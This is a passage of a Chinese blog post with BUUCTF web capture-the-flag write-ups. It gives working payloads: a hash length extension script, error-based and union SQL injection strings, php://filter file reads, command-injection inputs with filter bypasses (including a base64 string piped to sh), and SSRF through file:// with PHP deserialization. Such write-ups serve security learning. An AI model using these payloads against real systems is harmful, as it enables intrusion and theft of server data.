class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>我们发现，代码中定义了一个<code>task</code>类，其中主要包括三部分：<code>__init__()</code>、<code>Exec()</code>、<code>checkSign</code>。<br><code>__init__()</code>中以用户的<code>IP</code>生成一个沙箱：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br></pre></td></tr></table></figure>
<p><code>Exec()</code>可以执行一些操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                result[<span class="string">'data'</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>我们可以看到，<code>Exec()</code>函数可以执行<code>scan</code>操作，对目标文件进行扫描并把结果存在<code>result.txt</code>中；<code>read</code>操作可以读取<code>ressult.txt</code>中的内容。同时<code>param</code>又是用户输入，那么通过利用<code>param</code>和上述两个操作，进行<code>SSRF</code>以拿到flag。</p>
<p>往下我们看到三个路由：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br></pre></td></tr></table></figure>
<p><code>/geneSign</code>路由：获得param参数，通过<code>action</code>和<code>param</code>生成签名。并且在服务端的签名是通过<code>action=&quot;scan&quot;</code>生成的，那就限制了用户执行的方法。<br><code>/De1ta</code>路由：获取<code>cookie</code>中的<code>action</code>和<code>param</code>以及签名<code>sign</code>，如果<code>param</code>合法则生成<code>task</code>对象，并返回执行的内容。<br><code>/</code>路由：读取代码。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们从前面知道，服务端的签名已经限制为<code>action=&quot;scan&quot;</code>了，因此如果我们传入的方法有<code>read</code>那签名值将会不同，将不能实现读取。<br>因此我们需要绕过<code>sign</code>的限制。我们可以发现<code>getSign</code>其实是有漏洞的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>即当我们输入<code>param=flag.txtread</code>的时候，那<code>sign</code>值就是包含<code>read</code>和<code>scan</code>的了，也就可以实现对文件的读取了。</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>这里有两种方法，第一种是利用<code>SSRF</code>，也是本题的考点，第二种是<code>hash长度扩展攻击</code>，看别的大佬的思路才知道的。</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>首先我们在<code>/geneSign</code>路由中利用<code>param=flag.txtread</code>生成一个签名：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web9.png" alt=""><br>然后通过<code>/De1ta</code>路由生成服务端的签名，需要利用BP抓包改包：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web10.png" alt=""><br>这里需要注意，我们在<code>/De1ta</code>路由是通过<code>GET</code>方式传<code>param</code>的，但是<code>Cookie</code>需要我们手动加入，从下面这段代码可知：我们需要在<code>cookie</code>中写入<code>action</code>和<code>sign</code>值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br></pre></td></tr></table></figure>
<p>从而实现通过构造<code>sign</code>绕过限制实现<code>SSRF</code>读取服务器资源，拿到flag。</p>
<h4 id="Hash长度扩展攻击"><a href="#Hash长度扩展攻击" class="headerlink" title="Hash长度扩展攻击"></a>Hash长度扩展攻击</h4><p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了<code>H(密钥 ∥ 消息)</code>此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。<br>一般满足下面条件的情形可以进行哈希长度扩展攻击：</p>
<ul>
<li>1、准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）；</li>
<li>2、让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文；</li>
<li>3、服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li>
</ul>
<p>详细可参考：<a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/69264.html</a><br>该题中，<code>sign</code>的计算：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>显然满足这种情况，因此可以进行哈希长度扩展攻击。<br>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">txt1 = <span class="string">'flag.txt'</span></span><br><span class="line">r = requests.get(<span class="string">'http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/geneSign'</span>, params=&#123;<span class="string">'param'</span>: txt1&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, txt1 + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">r = requests.get(<span class="string">'http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/De1ta'</span>, params=&#123;<span class="string">'param'</span>: txt1&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">'sign'</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">'action'</span>: urllib.parse.quote(hash_sign[<span class="number">1</span>][len(txt1):])</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入链接，是一个可以注册和登录的页面，这里的注册页面是以<code>POST</code>上传数据的，利用<code>sqlmap</code>测试发现有<code>POST</code>注入，具体方法是：</p>
<ul>
<li>1、注册用户时用BP抓包，保存<code>POST</code>表单的数据到文件;</li>
<li>2、然后利用<code>sqlmap</code>爆库：</li>
</ul>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">python</span> <span class="comment">sqlmap</span><span class="string">.</span><span class="comment">py</span> <span class="literal">-</span><span class="comment">r</span> <span class="comment">"the</span> <span class="comment">path</span> <span class="comment">of</span> <span class="comment">the</span> <span class="comment">catched</span> <span class="comment">file"</span> --<span class="comment">dump</span> --<span class="comment">dbs</span></span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web13.png" alt=""><br>这个截图中没有体现出完整的数据库信息，完整的序列化内容中包含的还有<code>blog</code>的地址，下面的<code>payload</code>中可以看到。</p>
<p>经过测试，在<code>wiew.php</code>路径下存在<code>GET</code>注入，这里存在报错注入，可以利用<code>extractvalue()</code>和<code>updatexml()</code>进行测试，但是我在用<code>extractvalue()</code>进行测试时失败了，用<code>updatexml()</code>可以成功注入。利用<code>extractvalue()</code>的报错注入可参考我之前的文章<a href="http://47.107.152.5:2017/2020/02/02/RootersCTF-Babyweb-WriteUp/" target="_blank" rel="noopener">RootersCTF-Babyweb-WriteUp</a>。<br>报错注入可参考：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>
<h3 id="进行GET注入"><a href="#进行GET注入" class="headerlink" title="进行GET注入"></a>进行GET注入</h3><p>利用常规的手注方法，结合<code>updatexml()</code>以实现报错注入：</p>
<ul>
<li>1、爆库名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">view</span>.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web14.png" alt=""></p>
<ul>
<li>2、爆表名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">view</span>.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web15.png" alt=""></p>
<ul>
<li>3、爆列名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">view</span>.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>="users")),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web16.png" alt=""></p>
<ul>
<li>4、爆字段</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/view.php?no=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(select data <span class="keyword">from</span> users)),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ggb0n.cool/images/BUUCTF-web17.png" alt=""><br>我们看到，最后爆出的字段知包含了一串序列化的内容，也可以根据<code>POST</code>注入的结果发现，而并没有拿到flag。这里要注意，<code>union select</code>联合查询会被检测出，因此用<code>\**\</code>来绕过。<br>参考网上的WP发现，该题并非只考察注入，<strong>还考察了<code>SSRF</code>、反序列化构造file文件协议</strong>。</p>
<h3 id="利用File协议进行SSRF读取flag文件"><a href="#利用File协议进行SSRF读取flag文件" class="headerlink" title="利用File协议进行SSRF读取flag文件"></a>利用File协议进行SSRF读取flag文件</h3><p>御剑扫描发现<code>robots.txt</code>和<code>flag.php</code>文件，并且根据前面报错注入的返回页面可见，<code>flag.php</code>文件是存在<code>/var/www/html/</code>下的。同时在<code>robots.txt</code>中发现了备份文件<code>/user.php.bak</code>，其源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现<code>get()</code>函数总传参是一个<code>url</code>，因此猜测存在<code>SSRF</code>，前面我们也知道了可以利用<code>file://</code>协议来读取flag文件，可以构造<code>file:///var/www/html/flag.php</code>语句并将其作为用户的<code>blog</code>地址写入，最后利用联合查询和反序列化将该语句写入到数据库，payload如下：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">/<span class="built_in">view</span>.php?no=<span class="number">0</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,'O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">"blog"</span>;s:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;'</span><br></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web11.png" alt=""><br>此时，我们写入的可以读取文件的<code>blog</code>地址已经奏效，查看源码可以看到一串base64的编码，解码即为读取的<code>flag.php</code>的内容。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web12.png" alt=""></p>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>目测是签到题，源码中提示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单，<code>?cat=dog</code>即可</p>
<h2 id="RoarCTF-2019-EasyJava"><a href="#RoarCTF-2019-EasyJava" class="headerlink" title="[RoarCTF 2019]EasyJava"></a>[RoarCTF 2019]EasyJava</h2><p>考察<code>web.xml</code>的泄露，Javaweb没学过…不过这个题目学到了一点：<strong>类似于题目给的Help文件下载失败的时候可以尝试改变请求方式</strong>去下载。<br>附上一些有关源码泄露的网站：<a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>进去题目之后看源码，发现<code>Archive_room.php</code>文件，点进去之后给了一个按钮，这个按钮存在<code>302跳转</code>，因此需要BP抓包。<br>抓包发现，点击时候先访问的是<code>action.php</code>，在改文件中看到了提示的<code>secr3t.php</code>文件，再查看这个文件给了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>容易看出是文件包含，利用php伪协议读取即可：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h2><p>根据题目提示和参数<code>ip</code>可知，与命令执行相关<br>第一步，利用<code>|</code>可以执行<code>ls</code>命令，读取内容：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls</span><br></pre></td></tr></table></figure>
<p>发现存在<code>flag.php</code>和<code>index.php</code>文件，但是直接利用<code>cat flag.php</code>去读取发现空格被ban，此处考察了绕过空格被ban的方法（与linux系统命令的执行相关）：</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 <span class="comment">//$1中的数字可以更改</span></span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
<p>通过尝试发现<code>$IFS$1</code>可以绕过空格<br>此时又提示<code>flag</code>被ban，绕过的方法也比较多样：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">变量拼接：ip=1;a=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br><span class="line">内联执行：ip=1;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1</span>`<span class="keyword">ls</span>` <span class="comment">//注意这里是反单引号，命令会将反引号中的输出作为输入进行执行</span></span><br><span class="line">利用<span class="keyword">sh</span>/bash： ip=1;echo<span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-<span class="keyword">d</span>|<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
<p>利用<code>内联执行</code>方法绕过，需要到<code>控制台</code>的<code>sources</code>下查看内容，如图：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web18.png" alt=""></p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>一道<code>PHP反序列化</code>题目，主要考察了<code>private</code>定义字段的绕过方法。</p>
<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>提示有备份文件，扫后台可以得知是<code>www.zip</code>，下载文件、审计源码，在<code>class.php</code>中发现了反序列化的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据代码逻辑可知，我们需要绕过<code>wakeup()</code>函数，这个很简单，更改序列化之后类的属性个数即可。</p>
